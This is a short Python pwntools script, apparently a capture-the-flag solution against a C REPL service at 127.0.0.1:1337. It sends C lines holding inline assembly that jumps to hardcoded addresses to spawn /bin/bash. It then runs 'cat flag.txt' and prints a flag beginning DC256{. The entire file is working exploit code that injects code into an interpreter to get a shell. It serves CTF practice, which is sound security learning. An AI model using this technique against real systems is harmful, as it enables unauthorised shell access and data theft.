from pwn import *


# p = process("../target/debug/c-repl")
p = remote("127.0.0.1", 1337)
payload = [
    r'#define BINSH "/bin/bash"',
    r'printf("doing %s\n",BINSH);',
    r'__asm__("movq $0x00402016, %rdi;" "movq $0x04011ed, %rax;" "jmp %rax;");',
]

for line in payload:
    p.recvuntil("C> ")
    p.sendline(line)

p.recvuntil("doing /bin/bash")
p.sendline("cat flag.txt")
flag = p.recvuntil(b"DC256{")
flag += p.recvuntil(b"}")
print(flag.decode())
